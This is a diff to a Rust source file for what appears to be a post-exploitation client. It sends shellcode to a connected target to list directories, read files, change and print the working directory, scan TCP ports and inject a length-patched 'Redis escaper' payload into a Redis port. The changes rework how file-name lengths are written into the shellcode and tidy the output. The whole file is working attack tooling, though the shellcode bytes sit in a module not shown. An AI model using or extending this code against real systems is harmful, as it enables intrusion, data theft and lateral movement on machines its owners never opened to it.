@@ -3,7 +3,7 @@ use std::{io::{self, Write, Read}, error::Error, net::Shutdown};
 use colored::Colorize;
 use errno::Errno;
 
-use crate::{util::{print_error, print_success}, config::Config, shellcode::{SYS_OPEN_DIR_SENDER, SYS_OPEN_CAT_SENDER, SYS_CHDIR_CD_SENDER, SYS_GETCWD_CWD_SENDER, SYS_GETUID_GETUID_SENDER, SYS_GETGID_GETGID_SENDER, SYS_SOCKET_SYS_CONNECT_PORT_SCANNER, SHELLCODE_LEN, REDIS_ESCAPER}};
+use crate::{util::{print_error, print_success, colorized_file}, config::Config, shellcode::{SYS_GETUID_GETUID_SENDER, SYS_GETGID_GETGID_SENDER, SHELLCODE_LEN, REDIS_ESCAPER, OPEN_DIR_SENDER, OPEN_CAT_SENDER, CD_SENDER, PWD_SENDER, TCP_PORT_SCANNER}};
 
 fn help() {
     println!(
@@ -29,27 +29,38 @@ fn help() {
     );
 }
 
-fn dir(config: &Config, file: &str) -> Result<(), Box<dyn Error>> {
+fn dir(config: &Config, directory: &str) -> Result<(), Box<dyn Error>> {
     if config.conn.is_none() {
         return Err("Server not connected".into());
     }
-    // Maximum file length is 256
-    let dir_sender = SYS_OPEN_DIR_SENDER;
-    let mut dir_shellcode = dir_sender.shellcode.to_vec();
-    dir_shellcode.extend(file.as_bytes());
-    dir_shellcode.push(0);
-    dir_shellcode.resize(SHELLCODE_LEN, 0);
+    if directory.len() >= 0x10000 {
+        return Err("dir: file name too long".into());
+    }
+    let dir_name_len: u16 = (directory.len() + 1) as u16; // include null byte
+    let dir_sender = OPEN_DIR_SENDER;
+
+    let mut shellcode = dir_sender.shellcode.to_vec();
+    shellcode[dir_sender.dir_len_index] = (dir_name_len & 0xff) as u8;
+    shellcode[dir_sender.dir_len_index + 1] = ((dir_name_len & 0xff00) >> 8) as u8;
+    shellcode.resize(SHELLCODE_LEN, 0);
 
     let mut conn = config.conn.as_ref().unwrap();
-    conn.write(&dir_shellcode)?;
+    conn.write(&shellcode)?;
+    conn.write(directory.as_bytes())?;
+    conn.write(&[0])?;
 
     let mut beacon_buff = [0; 8];
     conn.read_exact(&mut beacon_buff)?;
     let beacon = i64::from_le_bytes(beacon_buff);
 
     if beacon < 0 {
-        let e = -beacon;
-        let message = format!("ls: cannot access '{}': {}", file, Errno(e as i32));
+        let errno = -beacon;
+        /* Not a directory: print the file directly */
+        if errno == 20 {
+            println!("{}", directory);
+            return Ok(());
+        }
+        let message = format!("dir: cannot access '{}': {}", directory, Errno(errno as i32));
         return Err(message.into());
     }
 
@@ -83,39 +94,7 @@ fn dir(config: &Config, file: &str) -> Result<(), Box<dyn Error>> {
         conn.read_exact(&mut d_type_buff)?;
         let d_type = u8::from_le_bytes(d_type_buff);
 
-        let file_name_colored = match d_type {
-            0 => { // DT_UNKNOWN
-                file_name
-            }
-            1 => { // DT_FIFO
-                file_name.yellow().on_black().to_string()
-            },
-            2 => { // DT_CHR
-                file_name.yellow().bold().to_string()
-            },
-            4 => { // DT_DIR
-                file_name.blue().bold().to_string()
-            },
-            6 => { // DT_BLK
-                file_name.yellow().bold().to_string()
-            },
-            8 => { // DT_REG
-                file_name
-            },
-            10 => { // DT_LNK
-                file_name.cyan().bold().to_string()
-            }
-            12 => { // DT_SOCK
-                file_name.magenta().bold().to_string()
-            },
-            14 => { // DT_WHT
-                file_name
-            },
-            _ => {
-                file_name
-            }
-        };
-
+        let file_name_colored = colorized_file(&file_name, d_type);
         println!("{}", file_name_colored);
 
         index += d_reclen as u64;
@@ -128,15 +107,20 @@ fn cat(config: &Config, file: &str) -> Result<(), Box<dyn Error>> {
     if config.conn.is_none() {
         return Err("Server not connected".into());
     }
-    let cat_sender = SYS_OPEN_CAT_SENDER;
-    let mut cat_shellcode = cat_sender.shellcode.to_vec();
-    cat_shellcode.extend(file.as_bytes());
-    cat_shellcode.push(0);
-    cat_shellcode.resize(SHELLCODE_LEN, 0);
-
+    if file.len() >= 0x10000 {
+        return Err("cat: file name too long".into());
+    }
+    let file_name_len: u16 = (file.len() + 1) as u16; // include null byte
+    let cat_sender = OPEN_CAT_SENDER;
+    let mut shellcode = cat_sender.shellcode.to_vec();
+    shellcode[cat_sender.file_len_index] = (file_name_len & 0xff) as u8;
+    shellcode[cat_sender.file_len_index + 1] = ((file_name_len & 0xff00) >> 8) as u8;
+    shellcode.resize(SHELLCODE_LEN, 0);
 
     let mut conn = config.conn.as_ref().unwrap();
-    conn.write(&cat_shellcode)?;
+    conn.write(&shellcode)?;
+    conn.write(file.as_bytes())?;
+    conn.write(&[0])?;
 
     let mut beacon_buff = [0; 8];
     let mut file_content_buff = Vec::new();
@@ -147,8 +131,8 @@ fn cat(config: &Config, file: &str) -> Result<(), Box<dyn Error>> {
             break;
         }
         if beacon < 0 {
-            let e = -beacon;
-            let message = format!("cat: cannot access '{}': {}", file, Errno(e as i32));
+            let errno = -beacon;
+            let message = format!("cat: cannot access '{}': {}", file, Errno(errno as i32));
             return Err(message.into());
         }
         let chunk_len = beacon as u64;
@@ -167,24 +151,32 @@ fn cd(config: &Config, file: &str) -> Result<(), Box<dyn Error>> {
     if config.conn.is_none() {
         return Err("Server not connected".into());
     }
-    let cd_sender = SYS_CHDIR_CD_SENDER;
-    let mut cd_shellcode = cd_sender.shellcode.to_vec();
-    cd_shellcode.extend(file.as_bytes());
-    cd_shellcode.push(0);
+    if file.len() >= 0x10000 {
+        return Err("cd: file name too long".into());
+    }
+    let file_name_len: u16 = (file.len() + 1) as u16;
+    let cd_sender = CD_SENDER;
+    let mut shellcode = cd_sender.shellcode.to_vec();
+    shellcode[cd_sender.file_len_index] = (file_name_len & 0xff) as u8;
+    shellcode[cd_sender.file_len_index + 1] = ((file_name_len & 0xff00) >> 8) as u8;
+    shellcode.resize(SHELLCODE_LEN, 0);
 
     let mut conn = config.conn.as_ref().unwrap();
-    conn.write(&cd_shellcode)?;
+    conn.write(&shellcode)?;
+    conn.write(file.as_bytes())?;
+    conn.write(&[0])?;
 
     let mut beacon_buff = [0; 8];
     conn.read_exact(&mut beacon_buff)?;
     let beacon = i64::from_le_bytes(beacon_buff);
     if beacon < 0 {
-        let e = -beacon;
-        let message = format!("cd: cannot access '{}': {}", file, Errno(e as i32));
+        let errno = -beacon;
+        let message = format!("cd: cannot access '{}': {}", file, Errno(errno as i32));
         return Err(message.into());
     }
 
-    println!("Changed to '{}' successfully", file);
+    let message = format!("Directory changed to '{}'", file);
+    print_success(&message);
 
     Ok(())
 }
@@ -193,7 +185,7 @@ fn pwd(config: &Config) -> Result<(), Box<dyn Error>> {
     if config.conn.is_none() {
         return Err("Server not connected".into());
     }
-    let pwd_sender = SYS_GETCWD_CWD_SENDER;
+    let pwd_sender = PWD_SENDER;
     let mut pwd_shellcode = pwd_sender.shellcode.to_vec();
     pwd_shellcode.resize(SHELLCODE_LEN, 0);
 
@@ -281,7 +273,8 @@ pub fn portscan(config: &mut Config) -> Result<(), Box<dyn Error>> {
     if config.conn.is_none() {
         return Err("Server not connected".into());
     }
-    let tcp_scanner = SYS_SOCKET_SYS_CONNECT_PORT_SCANNER;
+
+    let tcp_scanner = TCP_PORT_SCANNER;
     let mut tcp_scanner_shellcode = tcp_scanner.shellcode.to_vec();
     tcp_scanner_shellcode.resize(SHELLCODE_LEN, 0);
 
@@ -292,14 +285,17 @@ pub fn portscan(config: &mut Config) -> Result<(), Box<dyn Error>> {
     conn.read_exact(&mut open_port_num_buff)?;
     let open_port_num = i64::from_le_bytes(open_port_num_buff);
 
-    print_success("Open ports: ");
+    let mut open_ports = Vec::new();
     for _ in 0..open_port_num {
         let mut open_port_buff = [0; 2];
         conn.read_exact(&mut open_port_buff)?;
         let open_port = u16::from_le_bytes(open_port_buff);
-
-        println!("{}", open_port);
+        open_ports.push(open_port);
     }
+
+    let open_ports_str = open_ports.iter().map(|&x| x.to_string()).collect::<Vec<String>>().join(", ");
+    let message = format!("Open ports: {}", open_ports_str);
+    print_success(&message);
 
     Ok(())
 }
@@ -341,10 +337,14 @@ pub fn redis(config: &mut Config, port: u16) -> Result<(), Box<dyn Error>> {
 
         let redis_escaper = REDIS_ESCAPER;
         let mut redis_escaper_shellcode = redis_escaper.shellcode.to_vec();
-        redis_escaper_shellcode[redis_escaper.data_length_index] = (payload_len & 0xff) as u8;
-        redis_escaper_shellcode[redis_escaper.data_length_index + 1] = ((payload_len & 0xff00) >> 8) as u8;
-        redis_escaper_shellcode[redis_escaper.data_length_index + 2] = ((payload_len & 0xff0000) >> 16) as u8;
-        redis_escaper_shellcode[redis_escaper.data_length_index + 3] = ((payload_len & 0xff000000) >> 24) as u8;
+        redis_escaper_shellcode[redis_escaper.data_length_index0] = (payload_len & 0xff) as u8;
+        redis_escaper_shellcode[redis_escaper.data_length_index0 + 1] = ((payload_len & 0xff00) >> 8) as u8;
+        redis_escaper_shellcode[redis_escaper.data_length_index0 + 2] = ((payload_len & 0xff0000) >> 16) as u8;
+        redis_escaper_shellcode[redis_escaper.data_length_index0 + 3] = ((payload_len & 0xff000000) >> 24) as u8;
+        redis_escaper_shellcode[redis_escaper.data_length_index1] = (payload_len & 0xff) as u8;
+        redis_escaper_shellcode[redis_escaper.data_length_index1 + 1] = ((payload_len & 0xff00) >> 8) as u8;
+        redis_escaper_shellcode[redis_escaper.data_length_index1 + 2] = ((payload_len & 0xff0000) >> 16) as u8;
+        redis_escaper_shellcode[redis_escaper.data_length_index1 + 3] = ((payload_len & 0xff000000) >> 24) as u8;
         redis_escaper_shellcode[redis_escaper.port_index] = ((port & 0xff00) >> 8) as u8;
         redis_escaper_shellcode[redis_escaper.port_index + 1] = (port & 0xff) as u8;
         redis_escaper_shellcode.resize(SHELLCODE_LEN, 0);
